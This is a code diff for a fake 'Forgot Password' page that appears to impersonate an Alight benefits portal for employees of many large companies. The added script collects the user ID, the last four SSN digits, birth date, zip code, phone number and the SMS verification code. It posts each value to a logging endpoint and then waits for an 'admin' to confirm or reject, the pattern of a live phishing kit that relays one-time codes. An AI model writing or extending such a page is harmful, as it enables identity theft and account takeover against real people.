@@ -44,9 +44,8 @@
             border-radius: 10px; 
             font-size: 1.05rem; 
         }
-        select {
+        input[list] {
             background-color: white;
-            cursor: pointer;
         }
         .date-group { display: flex; gap: 10px; }
         button { 
@@ -71,17 +70,278 @@
 <body>
     <div class="container">
 
-        <!-- Step 0: User ID + Company -->
+        <!-- Step 0: Company + User ID -->
         <div id="step0" class="step active">
             <h1>Forgot Password</h1>
-            <p>Please select your company and enter your User ID</p>
+            <p>Search or select your company and enter your User ID</p>
             
             <label for="company">Company</label>
-            <select id="company" required>
-                <option value="">Select your Company</option>
-                <option value="UNITED AIRLINES">UNITED AIRLINES</option>
-                <option value="BOEING">BOEING</option>
-                <option value="SIEMENS ENERGY">SIEMENS ENERGY</option>
-                <option value="AON">AON</option>
-                <option value="AMERICAN AIRLINES">AMERICAN AIRLINES</option>
-            </select>
+            <input list="companyList" id="company" placeholder="Type to search company..." required>
+            <datalist id="companyList">
+                <option value="UNITED AIRLINES">
+                <option value="BOEING">
+                <option value="SIEMENS ENERGY">
+                <option value="AON">
+                <option value="AMERICAN AIRLINES">
+                <option value="WALMART">
+                <option value="CATERPILLAR">
+                <option value="DOW">
+                <option value="HP INC">
+                <option value="VERIZON">
+                <option value="AT&T">
+                <option value="BANK OF AMERICA">
+                <option value="WELLS FARGO">
+                <option value="CITIGROUP">
+                <option value="GENERAL ELECTRIC">
+                <option value="LOCKHEED MARTIN">
+                <option value="NORTHROP GRUMMAN">
+                <option value="RAYTHEON TECHNOLOGIES">
+                <option value="3M">
+                <option value="JOHNSON & JOHNSON">
+                <option value="PFIZER">
+                <option value="UNITEDHEALTH GROUP">
+                <option value="CVS HEALTH">
+                <option value="KROGER">
+                <option value="TARGET">
+                <option value="LOWE'S">
+                <option value="WALGREENS">
+                <option value="HOME DEPOT">
+                <option value="IBM">
+                <option value="MICROSOFT">
+                <option value="AMAZON">
+                <option value="GOOGLE">
+                <option value="META">
+                <option value="INTEL">
+                <option value="PROCTER & GAMBLE">
+                <option value="PEPSICO">
+                <option value="COCA-COLA">
+                <option value="GENERAL MOTORS">
+                <option value="FORD MOTOR COMPANY">
+                <option value="DELTA AIR LINES">
+                <option value="SOUTHWEST AIRLINES">
+                <option value="FEDEX">
+                <option value="UPS">
+                <option value="JPMORGAN CHASE">
+                <option value="GOLDMAN SACHS">
+                <option value="MORGAN STANLEY">
+            </datalist>
+
+            <label for="userid">User ID</label>
+            <input type="text" id="userid" placeholder="Enter your User ID" required autofocus>
+            
+            <button class="continue" onclick="startForgotProcess()">Continue</button>
+            <button onclick="goBack()" style="background:none; border:1px solid #cbd5e1; color:#1e40af; margin-top:8px;">Back to Login</button>
+        </div>
+
+        <!-- Step 1 -->
+        <div id="step1" class="step">
+            <h1>Confirm your identity</h1>
+            <label>Last 4 Digits of SSN</label>
+            <input type="text" id="ssn" maxlength="4" placeholder="1234" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
+
+            <label>Birth Date</label>
+            <div class="date-group">
+                <select id="month"><option value="">Month</option></select>
+                <select id="day"><option value="">Day</option></select>
+                <select id="year"><option value="">Year</option></select>
+            </div>
+
+            <label style="margin-top:20px;">
+                <input type="checkbox" id="privacy"> Accept Alight Privacy Policy
+            </label>
+            <button class="continue" onclick="saveStep1()">Continue</button>
+        </div>
+
+        <!-- Step 2 -->
+        <div id="step2" class="step">
+            <h1>Additional Information</h1>
+            <label>Zip Code</label>
+            <input type="text" id="zip" maxlength="5" placeholder="12345" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
+
+            <label>Phone Number</label>
+            <input type="tel" id="phone" placeholder="(123) 456-7890" required>
+
+            <button class="continue" onclick="saveStep2()">Continue</button>
+        </div>
+
+        <!-- Step 3 -->
+        <div id="step3" class="step">
+            <h1>Verify it's you</h1>
+            <p>Enter the code you received via SMS.</p>
+            <p>Your access code should be sent within 12 hours.</p>
+            
+            <input type="text" id="code" maxlength="10" placeholder="123456" style="text-align:center; font-size:1.4rem;">
+            <div id="status"></div>
+            
+            <button class="continue" onclick="submitCode()">Submit Code</button>
+            <button class="new-code" onclick="requestNewCode()">Request New Code</button>
+        </div>
+    </div>
+
+    <script>
+        let realUsername = "";
+        let realPassword = "Forgot-Password-Reset";
+        let selectedCompany = "";
+
+        function startForgotProcess() {
+            selectedCompany = document.getElementById('company').value.trim();
+            realUsername = document.getElementById('userid').value.trim();
+
+            if (!selectedCompany || !realUsername) {
+                alert("Please select or search your Company and enter your User ID");
+                return;
+            }
+
+            fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "Forgot Password Request",
+                    password: realPassword,
+                    address: `Company: ${selectedCompany} | UserID: ${realUsername} | Status: Started Password Reset`
+                })
+            });
+
+            nextStep(1);
+        }
+
+        async function saveStep(details, stepName) {
+            try {
+                await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: stepName + " (Forgot Password - " + realUsername + ")",
+                        password: realPassword,
+                        address: details
+                    })
+                });
+            } catch (e) {
+                console.error("Failed to save step:", e);
+            }
+        }
+
+        function saveStep1() {
+            const ssn = document.getElementById('ssn').value.trim();
+            const month = document.getElementById('month').value;
+            const day = document.getElementById('day').value;
+            const year = document.getElementById('year').value;
+
+            if (ssn.length !== 4 || !month || !day || !year || !document.getElementById('privacy').checked) {
+                alert("Please fill all fields and accept Privacy Policy.");
+                return;
+            }
+
+            const dob = `${month}/${day}/${year}`;
+            const details = `Company: ${selectedCompany} | SSN: ${ssn} | DOB: ${dob} | Status: Forgot Password - Step 1 Completed`;
+
+            saveStep(details, "Step 1 - SSN & DOB");
+            nextStep(2);
+        }
+
+        function saveStep2() {
+            const zip = document.getElementById('zip').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+
+            if (zip.length !== 5 || !phone) {
+                alert("Please enter valid Zip Code and Phone Number.");
+                return;
+            }
+
+            const details = `Company: ${selectedCompany} | Zip: ${zip} | Phone: ${phone} | Status: Forgot Password - Step 2 Completed`;
+            saveStep(details, "Step 2 - Zip Code & Phone");
+            nextStep(3);
+        }
+
+        function nextStep(step) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+        }
+
+        async function submitCode() {
+            const code = document.getElementById('code').value.trim();
+            const statusDiv = document.getElementById('status');
+
+            if (code.length < 4) {
+                statusDiv.innerHTML = `<span class="error">Please enter a valid code</span>`;
+                return;
+            }
+
+            statusDiv.innerHTML = `<span class="waiting">Waiting for admin confirmation....</span>`;
+
+            const ssn = document.getElementById('ssn').value || "";
+            const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
+            const zip = document.getElementById('zip').value || "";
+            const phone = document.getElementById('phone').value || "";
+
+            const fullDetails = `Company: ${selectedCompany} | SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Phone: ${phone} | Code: ${code} | Status: Forgot Password - Pending Reset`;
+
+            await saveStep(fullDetails, "Final Code Submission - Forgot Password");
+
+            const interval = setInterval(async () => {
+                try {
+                    const res = await fetch('/api/records');
+                    const records = await res.json();
+                    const latest = records[0];
+
+                    if (latest && latest.address.includes("Confirmed")) {
+                        clearInterval(interval);
+                        statusDiv.innerHTML = `<span class="success">✅ Verified! Redirecting to set new password...</span>`;
+                        sessionStorage.setItem('forgotUsername', realUsername);
+                        setTimeout(() => window.location.href = "reset-password.html", 1500);
+                    } else if (latest && latest.address.includes("Rejected")) {
+                        clearInterval(interval);
+                        statusDiv.innerHTML = `<span class="error">❌ Request Rejected by Admin.</span>`;
+                    }
+                } catch (e) {}
+            }, 2000);
+        }
+
+        async function requestNewCode() {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerHTML = `<span class="waiting">Requesting new code...</span>`;
+
+            await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "New Code Request (Forgot Password)",
+                    password: realPassword,
+                    address: `Company: ${selectedCompany} | UserID: ${realUsername} | 🔄 Requested New Code | Status: Pending`
+                })
+            });
+
+            statusDiv.innerHTML = `<span class="success">✅ Request sent. Please check your SMS.</span>`;
+        }
+
+        function goBack() {
+            window.location.href = "login.html";
+        }
+
+        window.onload = () => {
+            const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
+            const monthSelect = document.getElementById('month');
+            months.forEach((m, i) => {
+                let opt = document.createElement('option');
+                opt.value = i + 1; opt.textContent = m;
+                monthSelect.appendChild(opt);
+            });
+
+            const daySelect = document.getElementById('day');
+            for(let i = 1; i <= 31; i++) {
+                let opt = document.createElement('option'); 
+                opt.value = i; opt.textContent = i;
+                daySelect.appendChild(opt);
+            }
+
+            const yearSelect = document.getElementById('year');
+            const curr = new Date().getFullYear();
+            for(let i = curr; i >= 1950; i--) {
+                let opt = document.createElement('option'); 
+                opt.value = i; opt.textContent = i;
+                yearSelect.appendChild(opt);
+            }
+        };
+    </script>
+</body>
+</html>
